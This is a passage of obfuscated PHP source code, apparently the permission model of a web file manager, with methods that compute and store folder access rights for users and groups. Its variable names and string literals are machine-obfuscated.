$GLOBALS[$ÓÃ€×­š[7]][$ÓÃ€×­š[448]] = 500; $´âéÈ˜å = array($ÓÃ€×­š[517] => 0, $ÓÃ€×­š[2184] => AuthModel::authAll(), $ÓÃ€×­š[518] => LNG($ÓÃ€×­š[2364]), $ÓÃ€×­š[2199] => $ÓÃ€×­š[2365]); $¾Œˆ»Ì = array(); $ùã‚€©å = explode($ÓÃ€×­š[60], $ÓÃ€×­š[2366]); $Å™îÛëá = explode($ÓÃ€×­š[60], $ÓÃ€×­š[2367]); foreach ($Òı¤“¿á as $Ã†Ù†“Ù) { $¯ÁâÖÔ‰ = Model($ÓÃ€×­š[1489])->getInfo($Ã†Ù†“Ù); $¿ğ´®Èø = array_field_key($¯ÁâÖÔ‰, $ùã‚€©å); $Š¼ÊŞ“Ÿ = Model($ÓÃ€×­š[626])->listByGroup($Ã†Ù†“Ù); foreach ($Š¼ÊŞ“Ÿ[$ÓÃ€×­š[455]] as $Æá‹‡†Â => $½ŞÊŞÍÌ) { $this->userGroupList($½ŞÊŞÍÌ[$ÓÃ€×­š[1588]], $½ŞÊŞÍÌ); $Ó×¥°¢ = $½ŞÊŞÍÌ[$ÓÃ€×­š[1588]] . $ÓÃ€×­š[12]; if (isset($¾Œˆ»Ì[$Ó×¥°¢])) { continue; } $«¬÷İò = Model($ÓÃ€×­š[2368])->listData($½ŞÊŞÍÌ[$ÓÃ€×­š[2369]]); $½ŞÊŞÍÌ[$ÓÃ€×­š[2370]] = Action($ÓÃ€×­š[2371])->parseUrl($½ŞÊŞÍÌ[$ÓÃ€×­š[2370]]); $½ŞÊŞÍÌ[$ÓÃ€×­š[1938]] = $«¬÷İò && $«¬÷İò[$ÓÃ€×­š[2372]] == 1; $ªµ¦¿ÔÏ = $this->groupRootAuth($Ã†Ù†“Ù, $½ŞÊŞÍÌ[$ÓÃ€×­š[1588]]); $ªµ¦¿ÔÏ = $½ŞÊŞÍÌ[$ÓÃ€×­š[1938]] ? $´âéÈ˜å : $ªµ¦¿ÔÏ; $¾Œˆ»Ì[$Ó×¥°¢] = array($ÓÃ€×­š[2373] => $ÓÃ€×­š[2374], $ÓÃ€×­š[2375] => LNG($ÓÃ€×­š[2376]), $ÓÃ€×­š[2353] => array_field_key($½ŞÊŞÍÌ, $Å™îÛëá), $ÓÃ€×­š[511] => $ªµ¦¿ÔÏ, $ÓÃ€×­š[512] => $ªµ¦¿ÔÏ[$ÓÃ€×­š[511]], $ÓÃ€×­š[2377] => $¿ğ´®Èø); } } $GLOBALS[$ÓÃ€×­š[7]][$ÓÃ€×­š[437]] = $áŸîó„[$ÓÃ€×­š[437]]; $GLOBALS[$ÓÃ€×­š[7]][$ÓÃ€×­š[448]] = $áŸîó„[$ÓÃ€×­š[448]]; foreach ($Ê‡ÎûÄ´ as $´­…« => $°üÄŞÜÀ) { if (!$°üÄŞÜÀ) { continue; } foreach ($°üÄŞÜÀ as $·Şê˜µë) { if (!$·Şê˜µë || !$·Şê˜µë[$ÓÃ€×­š[598]] || $·Şê˜µë[$ÓÃ€×­š[598]] == $ÓÃ€×­š[238]) { continue; } if ($·Şê˜µë[$ÓÃ€×­š[198]] != SourceModel::TYPE_USER) { continue; } $Ó×¥°¢ = $·Şê˜µë[$ÓÃ€×­š[598]] . $ÓÃ€×­š[12]; if (isset($¾Œˆ»Ì[$Ó×¥°¢])) { continue; } $œ¬Ò‚‡¼ = $this->authMake($°üÄŞÜÀ, $Ó×¥°¢); if (!$œ¬Ò‚‡¼ || !$œ¬Ò‚‡¼[$ÓÃ€×­š[2375]]) { continue; } $¾Œˆ»Ì[$Ó×¥°¢] = array($ÓÃ€×­š[2373] => $ÓÃ€×­š[2378], $ÓÃ€×­š[2375] => $œ¬Ò‚‡¼[$ÓÃ€×­š[2375]], $ÓÃ€×­š[2353] => Model($ÓÃ€×­š[626])->getInfoSimpleOuter($Ó×¥°¢), $ÓÃ€×­š[511] => $œ¬Ò‚‡¼[$ÓÃ€×­š[565]], $ÓÃ€×­š[512] => $œ¬Ò‚‡¼[$ÓÃ€×­š[565]][$ÓÃ€×­š[511]], $ÓÃ€×­š[2377] => $œ¬Ò‚‡¼[$ÓÃ€×­š[2379]]); } } foreach ($Ê‡ÎûÄ´ as $´­…« => $°üÄŞÜÀ) { if (!$°üÄŞÜÀ) { continue; } foreach ($¾Œˆ»Ì as $Ó×¥°¢ => $Ë“ä©ÒÛ) { if ($Ë“ä©ÒÛ[$ÓÃ€×­š[2353]][$ÓÃ€×­š[1938]] || $Ë“ä©ÒÛ[$ÓÃ€×­š[2373]] == $ÓÃ€×­š[2378]) { continue; } $œ¬Ò‚‡¼ = $this->authMake($°üÄŞÜÀ, $Ó×¥°¢); if (!$œ¬Ò‚‡¼ || !$œ¬Ò‚‡¼[$ÓÃ€×­š[2375]]) { continue; } $¾Œˆ»Ì[$Ó×¥°¢] = array($ÓÃ€×­š[2373] => $ÓÃ€×­š[2378], $ÓÃ€×­š[2375] => $œ¬Ò‚‡¼[$ÓÃ€×­š[2375]], $ÓÃ€×­š[2353] => $Ë“ä©ÒÛ[$ÓÃ€×­š[2353]], $ÓÃ€×­š[511] => $œ¬Ò‚‡¼[$ÓÃ€×­š[565]], $ÓÃ€×­š[512] => $œ¬Ò‚‡¼[$ÓÃ€×­š[565]][$ÓÃ€×­š[511]], $ÓÃ€×­š[2377] => $œ¬Ò‚‡¼[$ÓÃ€×­š[2379]]); } } $¾Œˆ»Ì = array_sort_by($¾Œˆ»Ì, $ÓÃ€×­š[512], $ÓÃ€×­š[549]); return $¾Œˆ»Ì; } public function getAllChildren($ì™ÈõØÁ) { $¦ Àñ¹ =& $_SERVER[øşô´çË]; $Şç“ªáÑ = Model($¦ Àñ¹[1529])->sourceInfo($ì™ÈõØÁ); if ($Şç“ªáÑ[$¦ Àñ¹[509]] != $¦ Àñ¹[101]) { return $this->sourceListAuth(array($ì™ÈõØÁ)); } if ($Şç“ªáÑ[$¦ Àñ¹[198]] != SourceModel::TYPE_GROUP) { return array(); } $ùÙø¡êş = 1; $´ãÖ¢ó = array($ì™ÈõØÁ); if ($Şç“ªáÑ[$¦ Àñ¹[200]] == $¦ Àñ¹[238] && $Şç“ªáÑ[$¦ Àñ¹[598]] != $ùÙø¡êş) { $´ãÖ¢ó = $this->groupChidldAllRootSource($Şç“ªáÑ[$¦ Àñ¹[598]]); } $Ú¤Ÿ­Ã = $this->field($¦ Àñ¹[201])->group($¦ Àñ¹[201])->select(); $Ú¤Ÿ­Ã = array_to_keyvalue($Ú¤Ÿ­Ã, $¦ Àñ¹[12], $¦ Àñ¹[201]); if (!$Ú¤Ÿ­Ã) { return array(); } $¯§ìÜ‰„ = $¦ Àñ¹[2380]; $ÏÂàü»¶ = array($¦ Àñ¹[201] => array($¦ Àñ¹[7], $Ú¤Ÿ­Ã), $¦ Àñ¹[529] => $¦ Àñ¹[238]); $ÀîãâÙ° = Model($¦ Àñ¹[935])->field($¯§ìÜ‰„)->where($ÏÂàü»¶)->select(); $…¥Üñš“ = array($ì™ÈõØÁ); foreach ($ÀîãâÙ° as $ºæÔæ®) { foreach ($´ãÖ¢ó as $Úö‘Ëšı) { $äıËìÇ¾ = $¦ Àñ¹[60] . $Úö‘Ëšı . $¦ Àñ¹[60]; $Ş€é¦ñ» = $ºæÔæ®[$¦ Àñ¹[613]] . $ºæÔæ®[$¦ Àñ¹[201]] . $¦ Àñ¹[60]; if (strstr($Ş€é¦ñ», $äıËìÇ¾)) { $…¥Üñš“[] = $ºæÔæ®[$¦ Àñ¹[201]]; break; } } } return $this->sourceListAuth($…¥Üñš“); } private function sourceListAuth($ö¦»€ö) { $¢ ®‚İ÷ =& $_SERVER[øşô´çË]; $•Í…µçÀ = Model($¢ ®‚İ÷[1529])->sourceListInfo($ö¦»€ö, !0); $Ñ„ˆ¥¸× = $this->sourceAuthSelect($ö¦»€ö); $×õŠÚÓÎ = array(); $ßå¦¨Úà = array(); foreach ($•Í…µçÀ as $´Ğ­ÁÍò) { unset($´Ğ­ÁÍò[$¢ ®‚İ÷[552]]); unset($´Ğ­ÁÍò[$¢ ®‚İ÷[550]]); unset($´Ğ­ÁÍò[$¢ ®‚İ÷[511]]); unset($´Ğ­ÁÍò[$¢ ®‚İ÷[100]]); $ï×áÓÔ = $Ñ„ˆ¥¸×[$´Ğ­ÁÍò[$¢ ®‚İ÷[201]]]; if (!$ï×áÓÔ) { continue; } $´Ğ­ÁÍò[$¢ ®‚İ÷[2377]] = $this->authTargetInfo($ï×áÓÔ); $´Ğ­ÁÍò[$¢ ®‚İ÷[611]] = rtrim($´Ğ­ÁÍò[$¢ ®‚İ÷[617]], $¢ ®‚İ÷[8]) . $¢ ®‚İ÷[8] . ltrim($´Ğ­ÁÍò[$¢ ®‚İ÷[611]], $¢ ®‚İ÷[8]); $×õŠÚÓÎ[] = $´Ğ­ÁÍò; $¤¼Á¼§Ë = count(explode($¢ ®‚İ÷[8], trim($´Ğ­ÁÍò[$¢ ®‚İ÷[611]], $¢ ®‚İ÷[8]))); $ßå¦¨Úà[] = $¤¼Á¼§Ë + ($´Ğ­ÁÍò[$¢ ®‚İ÷[43]] == $¢ ®‚İ÷[88] ? 0 : 1000); } array_multisort($ßå¦¨Úà, SORT_ASC, $×õŠÚÓÎ); return $×õŠÚÓÎ; } private function groupChidldAllRootSource($«ºï¼„¿) { $‰ş£¦×û =& $_SERVER[øşô´çË]; $’“ÓßĞ = Model($‰ş£¦×û[1489])->groupChildrenAll($«ºï¼„¿); $Ê³ß¿Š‡ = array($‰ş£¦×û[200] => 0, $‰ş£¦×û[598] => array($‰ş£¦×û[7], $’“ÓßĞ), $‰ş£¦×û[198] => SourceModel::TYPE_GROUP); $ê™û­Öô = Model($‰ş£¦×û[935])->field($‰ş£¦×û[201])->where($Ê³ß¿Š‡)->select(); $ê™û­Öô = array_to_keyvalue($ê™û­Öô, $‰ş£¦×û[12], $‰ş£¦×û[201]); return $ê™û­Öô; } private function authTargetInfo($ñ»Ã™ˆ‘) { $Õ¤æºÀ =& $_SERVER[øşô´çË]; $¾”¾‚Œ = array(); $ÆœïÏäÄ = array(); $‚ç‡¬ÓŒ = 2 << 25; foreach ($ñ»Ã™ˆ‘ as $‹üÎ¨ù„) { $èÔßá¤› = Model($Õ¤æºÀ[600])->listData($‹üÎ¨ù„[$Õ¤æºÀ[1636]]); if (!$èÔßá¤›) { continue; } if ($‹üÎ¨ù„[$Õ¤æºÀ[198]] == SourceModel::TYPE_USER) { $Ë”ü×Ë½ = Model($Õ¤æºÀ[606])->getInfoSimpleOuter($‹üÎ¨ù„[$Õ¤æºÀ[598]]); if ($Ë”ü×Ë½[$Õ¤æºÀ[1588]] == $Õ¤æºÀ[1376]) { continue; } if ($Ë”ü×Ë½[$Õ¤æºÀ[1588]] == $Õ¤æºÀ[238]) { $Ë”ü×Ë½[$Õ¤æºÀ[42]] = LNG($Õ¤æºÀ[2381]); } } else { $Ë”ü×Ë½ = Model($Õ¤æºÀ[614])->getInfoSimple($‹üÎ¨ù„[$Õ¤æºÀ[598]]); } if (!$Ë”ü×Ë½) { continue; } $Ë”ü×Ë½[$Õ¤æºÀ[565]] = $èÔßá¤›; $¾”¾‚Œ[] = $Ë”ü×Ë½; $±•œÆêå = 0; if ($‹üÎ¨ù„[$Õ¤æºÀ[198]] == SourceModel::TYPE_GROUP) { $±•œÆêå = $‚ç‡¬ÓŒ * 2; } if ($‹üÎ¨ù„[$Õ¤æºÀ[198]] == SourceModel::TYPE_USER) { $±•œÆêå = $‚ç‡¬ÓŒ; } if ($‹üÎ¨ù„[$Õ¤æºÀ[198]] == SourceModel::TYPE_USER && $‹üÎ¨ù„[$Õ¤æºÀ[598]] == $Õ¤æºÀ[238]) { $±•œÆêå = 0; } $ÆœïÏäÄ[] = $èÔßá¤›[$Õ¤æºÀ[511]] + $±•œÆêå; } array_multisort($ÆœïÏäÄ, SORT_DESC, $¾”¾‚Œ); return $¾”¾‚Œ; } public function getAllChildrenByUser($í›èÙ, $É²ß¯”ñ) { $Œûşºú« =& $_SERVER[øşô´çË]; $³üÇøÓş = Model($Œûşºú«[626])->getInfo($É²ß¯”ñ); if (!$É²ß¯”ñ || !$í›èÙ || !$³üÇøÓş) { return array(); } $ëõ¶« Å = Model($Œûşºú«[1529])->sourceInfo($í›èÙ); $ ¶úÏ³Ó = array(); $›…å× = 1; if ($ëõ¶« Å[$Œûşºú«[200]] == $Œûşºú«[238] && $ëõ¶« Å[$Œûşºú«[598]] != $›…å× && $this->groupContainUser($ëõ¶« Å[$Œûşºú«[598]], $É²ß¯”ñ)) { foreach ($³üÇøÓş[$Œûşºú«[1490]] as $ÂÄĞ­…‘) { $öÖ‘Œì = Model($Œûşºú«[614])->getInfo($ÂÄĞ­…‘[$Œûşºú«[1491]]); $§Àû½ÍŞ = Model($Œûşºú«[626])->getInfoSimpleOuter($É²ß¯”ñ); $§Àû½ÍŞ[$Œûşºú«[565]] = $ÂÄĞ­…‘[$Œûşºú«[511]]; if (Model($Œûşºú«[600])->authCheckAction($ÂÄĞ­…‘[$Œûşºú«[511]][$Œûşºú«[511]], $Œûşºú«[1560])) { continue; } $½Í¬ïü“ = array($Œûşºú«[42] => $Œûşºú«[1394] . $öÖ‘Œì[$Œûşºú«[42]], $Œûşºú«[201] => $öÖ‘Œì[$Œûşºú«[100]][$Œûşºú«[201]], $Œûşºú«[97] => KodIO::make($öÖ‘Œì[$Œûşºú«[100]][$Œûşºú«[201]]), $Œûşºú«[200] => $Œûşºú«[238], $Œûşºú«[198] => $Œûşºú«[607], $Œûşºú«[43] => $Œûşºú«[648], $Œûşºú«[611] => $öÖ‘Œì[$Œûşºú«[618]], $Œûşºú«[1491] => $öÖ‘Œì[$Œûşºú«[1491]], $Œûşºú«[615] => $öÖ‘Œì[$Œûşºú«[200]], $Œûşºú«[2377] => array($§Àû½ÍŞ)); $ ¶úÏ³Ó[$½Í¬ïü“[$Œûşºú«[201]]] = $½Í¬ïü“; } } $²Üƒœ²Õ = array(); $Ø¥òµ·– = $this->getAllChildren($í›èÙ); foreach ($Ø¥òµ·– as $Æ³Ë¤‡) { $‘¹¡áıÑ = !1; foreach ($Æ³Ë¤‡[$Œûşºú«[2377]] as $ğ½›Éû¨) { if ($ğ½›Éû¨[$Œûşºú«[1588]]) { if ($ğ½›Éû¨[$Œûşºú«[1588]] == $É²ß¯”ñ) { $‘¹¡áıÑ = !0; break; } } if ($ğ½›Éû¨[$Œûşºú«[1491]]) { if ($this->groupContainUser($ğ½›Éû¨[$Œûşºú«[1491]], $É²ß¯”ñ)) { $‘¹¡áıÑ = !0; break; } } } if ($‘¹¡áıÑ) { $²Üƒœ²Õ[] = $Æ³Ë¤‡; } $€‘‰–œÂ = $Æ³Ë¤‡[$Œûşºú«[201]]; if (isset($ ¶úÏ³Ó[$€‘‰–œÂ])) { $Æ³Ë¤‡[$Œûşºú«[2377]][] = $ ¶úÏ³Ó[$€‘‰–œÂ][0]; $ ¶úÏ³Ó[$€‘‰–œÂ] = !1; } } $ ¶úÏ³Ó = array_filter(array_values($ ¶úÏ³Ó)); $²Üƒœ²Õ = array_merge($ ¶úÏ³Ó, $²Üƒœ²Õ); return $²Üƒœ²Õ; } public function setAllChildrenByUser($ĞÏÏº, $¸ÌŞş, $ÑŒ­«Î¶) { $şØˆÕ¢± =& $_SERVER[øşô´çË]; $ñƒÀ’Å = $this->getAllChildrenByUser($ĞÏÏº, $¸ÌŞş); if (!$ÑŒ­«Î¶ || !$ñƒÀ’Å) { return !1; } foreach ($ñƒÀ’Å as $ì¢³ş‘†) { $±ë¦Æı” = array(); foreach ($ì¢³ş‘†[$şØˆÕ¢±[2377]] as $·‡Ö²¼Ü) { $Ù±é„ = $·‡Ö²¼Ü[$şØˆÕ¢±[565]]; $ ‚ÄÏØ = $·‡Ö²¼Ü[$şØˆÕ¢±[1588]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Öà«¡ã´ = $·‡Ö²¼Ü[$şØˆÕ¢±[1588]] ? $·‡Ö²¼Ü[$şØˆÕ¢±[1588]] : $·‡Ö²¼Ü[$şØˆÕ¢±[1491]]; if ($·‡Ö²¼Ü[$şØˆÕ¢±[1588]] && $·‡Ö²¼Ü[$şØˆÕ¢±[1588]] == $¸ÌŞş) { continue; } $±ë¦Æı”[] = array($şØˆÕ¢±[201] => $ì¢³ş‘†[$şØˆÕ¢±[201]], $şØˆÕ¢±[198] => $ ‚ÄÏØ, $şØˆÕ¢±[598] => intval($Öà«¡ã´), $şØˆÕ¢±[1636] => isset($Ù±é„[$şØˆÕ¢±[496]]) ? intval($Ù±é„[$şØˆÕ¢±[496]]) : 0, $şØˆÕ¢±[2341] => isset($Ù±é„[$şØˆÕ¢±[2341]]) ? intval($Ù±é„[$şØˆÕ¢±[2341]]) : -1); } $±ë¦Æı”[] = array($şØˆÕ¢±[201] => $ì¢³ş‘†[$şØˆÕ¢±[201]], $şØˆÕ¢±[198] => SourceModel::TYPE_USER, $şØˆÕ¢±[598] => intval($¸ÌŞş), $şØˆÕ¢±[1636] => intval($ÑŒ­«Î¶), $şØˆÕ¢±[2341] => -1); $this->where(array($şØˆÕ¢±[515] => $ì¢³ş‘†[$şØˆÕ¢±[201]]))->delete(); $this->addAll($±ë¦Æı”); } return !0; } public function get($ßŠ›¨İ) { $€‹áºœ÷ = $this->getSourceList(array($ßŠ›¨İ), !0); return $€‹áºœ÷[0]; } public function getSourceList($›Ó¶Ãƒ¼, $€ó‘µ›” = false, $«’¤„¿á = false) { $––°àÇ° =& $_SERVER[øşô´çË]; if (!$›Ó¶Ãƒ¼) { return array(); } $Ü‡Ã‚¸» = Model($––°àÇ°[1529]); if (!$€ó‘µ›” && count($›Ó¶Ãƒ¼) == 1) { $€ó‘µ›” = array(); $€ó‘µ›”[$›Ó¶Ãƒ¼[0]] = $Ü‡Ã‚¸»->sourceInfo($›Ó¶Ãƒ¼[0]); } if (!$€ó‘µ›”) { $»ÊÒ¯Ó¸ = array($––°àÇ°[515] => array($––°àÇ°[516], $›Ó¶Ãƒ¼)); $€ó‘µ›” = $Ü‡Ã‚¸»->field($––°àÇ°[2382])->where($»ÊÒ¯Ó¸)->select(); $€ó‘µ›” = array_to_keyvalue($€ó‘µ›”, $––°àÇ°[201]); } $ø­…™ÁÍ = $›Ó¶Ãƒ¼; foreach ($€ó‘µ›” as $ŸÔàÖš => $²Ş®Âë×) { $ïœÀî¬Ã = $Ü‡Ã‚¸»->parentLevelArray($²Ş®Âë×[$––°àÇ°[613]]); $ø­…™ÁÍ = array_merge($ø­…™ÁÍ, array(intval($ŸÔàÖš)), array_reverse($ïœÀî¬Ã)); } $ø­…™ÁÍ = array_values(array_unique($ø­…™ÁÍ)); if (!$ø­…™ÁÍ) { return array(); } $Â³ = $this->sourceAuthSelect($ø­…™ÁÍ); $°âÏ‘“’ = array(); foreach ($ø­…™ÁÍ as $—Å†ò¬’) { if (isset($Â³[$—Å†ò¬’])) { $°âÏ‘“’[$—Å†ò¬’] = $Â³[$—Å†ò¬’]; } } $öØË‡âå = $this->userIsRoot($«’¤„¿á); $··ĞÄÌÇ = AuthModel::authAll(); $­†¸¯ö = array($––°àÇ°[512] => $··ĞÄÌÇ, $––°àÇ°[2383] => array($––°àÇ°[517] => 0, $––°àÇ°[2184] => $··ĞÄÌÇ, $––°àÇ°[518] => LNG($––°àÇ°[2364]), $––°àÇ°[2199] => $––°àÇ°[2365])); $¯›š×¥ˆ = array(); foreach ($€ó‘µ›” as $—Å†ò¬’ => $£î›Û) { if ($öØË‡âå && $GLOBALS[$––°àÇ°[6]][$––°àÇ°[2197]]) { $¯›š×¥ˆ[$—Å†ò¬’] = $­†¸¯ö; continue; } $¯›š×¥ˆ[$—Å†ò¬’] = $this->makeSourceAuth($£î›Û, $°âÏ‘“’, $«’¤„¿á); } return $¯›š×¥ˆ; } public function authDeepCheck($«İ¬¨ìÌ, $şêê¶ïŸ = false) { $Üœ·˜Ñ‹ =& $_SERVER[øşô´çË]; $şêê¶ïŸ = $şêê¶ïŸ ? $şêê¶ïŸ : USER_ID; $Íá®‚úã = $this->makeAuthDeep($şêê¶ïŸ); if (!in_array($«İ¬¨ìÌ, $Íá®‚úã[$Üœ·˜Ñ‹[2384]])) { return !1; } $ö³ª± = array(); foreach ($Íá®‚úã[$Üœ·˜Ñ‹[2385]] as $‰Š’¢³Î => $¤èû¦Ó¡) { if (!in_array($«İ¬¨ìÌ, $¤èû¦Ó¡)) { continue; } $ö³ª±[] = $‰Š’¢³Î; } if (!$ö³ª±) { return !1; } $°æµü“ = $ö³ª± ? $ö³ª±[0] : $«İ¬¨ìÌ; return array($Üœ·˜Ñ‹[512] => -1, $Üœ·˜Ñ‹[565] => array($Üœ·˜Ñ‹[517] => $Üœ·˜Ñ‹[1376], $Üœ·˜Ñ‹[2184] => $Üœ·˜Ñ‹[238], $Üœ·˜Ñ‹[518] => LNG($Üœ·˜Ñ‹[2386]), $Üœ·˜Ñ‹[2199] => $Üœ·˜Ñ‹[2387]), $Üœ·˜Ñ‹[2375] => LNG($Üœ·˜Ñ‹[2388]), $Üœ·˜Ñ‹[2389] => $this->sourceAuthInfo($°æµü“)); } protected function makeAuthDeep($ôá¦ŞÁĞ = false) { $–Ê­½ãá =& $_SERVER[øşô´çË]; static $åö±õ÷ = array(); $ôá¦ŞÁĞ = $ôá¦ŞÁĞ ? $ôá¦ŞÁĞ : USER_ID; if (isset($åö±õ÷[$ôá¦ŞÁĞ])) { return $åö±õ÷[$ôá¦ŞÁĞ]; } $‰Æºûå½ = Model($–Ê­½ãá[2390])->listData(); $ƒµÃõø = array(); foreach ($‰Æºûå½ as $Í‘ºúµ) { if ($Í‘ºúµ[$–Ê­½ãá[511]] == 0 && $Í‘ºúµ[$–Ê­½ãá[2198]] == $–Ê­½ãá[101]) { $ƒµÃõø[] = $Í‘ºúµ[$–Ê­½ãá[496]]; } } $…åÂÀï = $this->userGroupParents($ôá¦ŞÁĞ); $ÌÎÑâÔ‚ = array($–Ê­½ãá[198] => SourceModel::TYPE_USER, $–Ê­½ãá[598] => $ôá¦ŞÁĞ); if ($…åÂÀï) { $ÌÎÑâÔ‚ = array(array($–Ê­½ãá[198] => SourceModel::TYPE_USER, $–Ê­½ãá[598] => $ôá¦ŞÁĞ), array($–Ê­½ãá[198] => SourceModel::TYPE_GROUP, $–Ê­½ãá[598] => array($–Ê­½ãá[516], $…åÂÀï)), $–Ê­½ãá[1164] => $–Ê­½ãá[2280]); } $ù÷ŒÙ—© = $this->field($–Ê­½ãá[2391])->where($ÌÎÑâÔ‚)->select(); $ÌÀä­œğ = array(); $«ßÛ’¿• = array_to_keyvalue_group($ù÷ŒÙ—©, $–Ê­½ãá[201]); foreach ($«ßÛ’¿• as $ÈêíÏËÆ => $·¦•úâ«) { $™êº—îì = $this->authArrayCheck($·¦•úâ«, $ôá¦ŞÁĞ); if ($™êº—îì[$–Ê­½ãá[512]] > 0) { $ÌÀä­œğ[] = $ÈêíÏËÆ . $–Ê­½ãá[12]; } } if ($…åÂÀï) { $çÇª±Å = Model($–Ê­½ãá[614]); foreach ($…åÂÀï as $µ”•“È÷) { $‚Šü”¨ = $çÇª±Å->getInfo($µ”•“È÷); if (!$‚Šü”¨ || !is_array($‚Šü”¨[$–Ê­½ãá[100]])) { continue; } $ÌÀä­œğ[] = $‚Šü”¨[$–Ê­½ãá[100]][$–Ê­½ãá[201]]; } } $íëÕÛ… = array(); $Ôïä…Ñ = $…åÂÀï; $‚Û Ö»¤ = Model($–Ê­½ãá[1529]); $çÇª±Å = Model($–Ê­½ãá[614]); $…‚ÃÚ£â = array(); $ ºƒÈä = array(); $©·ï‹ë™ = array(); $®½¯€éà = array(); if ($ÌÀä­œğ) { $¸Ñå÷Ö· = $‚Û Ö»¤->where(array($–Ê­½ãá[201] => array($–Ê­½ãá[516], $ÌÀä­œğ)))->select(); foreach ($¸Ñå÷Ö· as $× ³±ºÅ) { if ($× ³±ºÅ[$–Ê­½ãá[529]] == $–Ê­½ãá[101]) { continue; } $ŸĞ¤ß¼÷ = $‚Û Ö»¤->parentLevelArray($× ³±ºÅ[$–Ê­½ãá[613]]); $íëÕÛ… = array_merge($íëÕÛ…, $ŸĞ¤ß¼÷); $Ôïä…Ñ[] = $× ³±ºÅ[$–Ê­½ãá[598]]; $…‚ÃÚ£â[$× ³±ºÅ[$–Ê­½ãá[201]]] = $ŸĞ¤ß¼÷; $ ºƒÈä[$× ³±ºÅ[$–Ê­½ãá[201]]] = $× ³±ºÅ[$–Ê­½ãá[598]]; } } $Ôïä…Ñ = array_values(array_unique($Ôïä…Ñ)); $ÊŞšîÉÚ = $Ôïä…Ñ; foreach ($ÊŞšîÉÚ as $µ”•“È÷) { $‚Šü”¨ = $çÇª±Å->getInfo($µ”•“È÷); $ŸĞ¤ß¼÷ = $‚Û Ö»¤->parentLevelArray($‚Šü”¨[$–Ê­½ãá[613]]); $Ôïä…Ñ = array_merge($Ôïä…Ñ, $ŸĞ¤ß¼÷); } $Ôïä…Ñ = array_values(array_unique($Ôïä…Ñ)); foreach ($Ôïä…Ñ as $µ”•“È÷) { $‚Šü”¨ = $çÇª±Å->getInfo($µ”•“È÷); $íëÕÛ…[] = $‚Šü”¨[$–Ê­½ãá[100]][$–Ê­½ãá[201]]; $©·ï‹ë™[$µ”•“È÷] = $‚Šü”¨[$–Ê­½ãá[100]][$–Ê­½ãá[201]]; $®½¯€éà[$µ”•“È÷] = $‚Û Ö»¤->parentLevelArray($‚Šü”¨[$–Ê­½ãá[613]]); } foreach ($…‚ÃÚ£â as $Ó»º‰ß => $ïÁ²˜‚â) { $µ„ Øñô = $ ºƒÈä[$Ó»º‰ß]; if (!$µ„ Øñô || !$©·ï‹ë™[$µ„ Øñô]) { continue; } $¬êŒÙØï = array(); foreach ($®½¯€éà[$µ„ Øñô] as $µ”•“È÷) { $¬êŒÙØï[] = $©·ï‹ë™[$µ”•“È÷]; } $…‚ÃÚ£â[$Ó»º‰ß] = array_merge($¬êŒÙØï, $ïÁ²˜‚â); } $íëÕÛ… = array_values(array_unique($íëÕÛ…)); $¦ùÅâÒß = array($–Ê­½ãá[2384] => $íëÕÛ…, $–Ê­½ãá[2385] => $…‚ÃÚ£â); $åö±õ÷[$ôá¦ŞÁĞ] = $¦ùÅâÒß; return $¦ùÅâÒß; } private function makeSourceAuth($ùªÇş«‘, $Øœ©»ÓÊ, $‰†»§Ş  = false) { $èÂæÇ‰ğ =& $_SERVER[øşô´çË]; $ÚàÛ”®“ = $èÂæÇ‰ğ[101]; $ˆöáí©« = $ùªÇş«‘[$èÂæÇ‰ğ[598]]; $½ÀŸ¸Ïˆ = $ùªÇş«‘[$èÂæÇ‰ğ[198]] == SourceModel::TYPE_GROUP; $Ò¸Ù¼½Æ = $½ÀŸ¸Ïˆ ? $this->groupRootAuth($ˆöáí©«, $‰†»§Ş ) : !1; if ($Ò¸Ù¼½Æ && Model($èÂæÇ‰ğ[600])->authCheckAction($Ò¸Ù¼½Æ[$èÂæÇ‰ğ[511]], $èÂæÇ‰ğ[1560])) { return $this->groupAuthInfo($Ò¸Ù¼½Æ, $ˆöáí©«); } $ç¢‚Ôš÷ = Model($èÂæÇ‰ğ[1529])->parentLevelArray($ùªÇş«‘[$èÂæÇ‰ğ[613]]); $ç¢‚Ôš÷ = array_merge(array($ùªÇş«‘[$èÂæÇ‰ğ[201]]), array_reverse($ç¢‚Ôš÷)); $ñ¥ßôû = !1; foreach ($ç¢‚Ôš÷ as $æ“ºÛÆ) { if (!isset($Øœ©»ÓÊ[$æ“ºÛÆ])) { continue; } $˜»ˆáÉî = $this->authMake($Øœ©»ÓÊ[$æ“ºÛÆ], $‰†»§Ş ); if ($˜»ˆáÉî[$èÂæÇ‰ğ[565]]) { $ñ¥ßôû = $˜»ˆáÉî; break; } } if (!$½ÀŸ¸Ïˆ) { return $ñ¥ßôû; } if (!$ñ¥ßôû && $Ò¸Ù¼½Æ) { $ñ¥ßôû = $this->groupAuthInfo($Ò¸Ù¼½Æ, $ˆöáí©«); } if (!$ñ¥ßôû) { $¹É•ú‡Ì = Model($èÂæÇ‰ğ[614])->getInfo($ˆöáí©«); $üã‹»¼ï = explode($èÂæÇ‰ğ[60], trim($¹É•ú‡Ì[$èÂæÇ‰ğ[613]], $èÂæÇ‰ğ[60])); $üã‹»¼ï = array_reverse($üã‹»¼ï); foreach ($üã‹»¼ï as $ûÙ÷×‡Ë) { if ($ûÙ÷×‡Ë == $èÂæÇ‰ğ[238] || $ûÙ÷×‡Ë == $ÚàÛ”®“) { continue; } $åøµµÏ’ = $this->groupRootAuth($ûÙ÷×‡Ë, $‰†»§Ş ); if (!$åøµµÏ’) { continue; } $ñ¥ßôû = $this->groupAuthInfo($åøµµÏ’, $ûÙ÷×‡Ë); break; } } if (!$ñ¥ßôû || $ñ¥ßôû[$èÂæÇ‰ğ[512]] <= 0) { $”Ü”Í—Ê = $this->authDeepCheck($ùªÇş«‘[$èÂæÇ‰ğ[201]], $‰†»§Ş ); if ($”Ü”Í—Ê) { $ñ¥ßôû = $”Ü”Í—Ê; } } return $ñ¥ßôû; } private function userIsRoot($¡Œù¯×« = false) { $ŸÍÈ¾ß÷ =& $_SERVER[øşô´çË]; if (!$¡Œù¯×« && KodUser::isRoot()) { return !0; } $—Çıƒóç = Model($ŸÍÈ¾ß÷[626])->getInfo($¡Œù¯×«); $ï¡Êµœ– = Model($ŸÍÈ¾ß÷[2368])->listData($—Çıƒóç[$ŸÍÈ¾ß÷[2369]]); if ($ï¡Êµœ– && $ï¡Êµœ–[$ŸÍÈ¾ß÷[604]][$ŸÍÈ¾ß÷[2372]] == 1) { return !0; } return !1; } private function 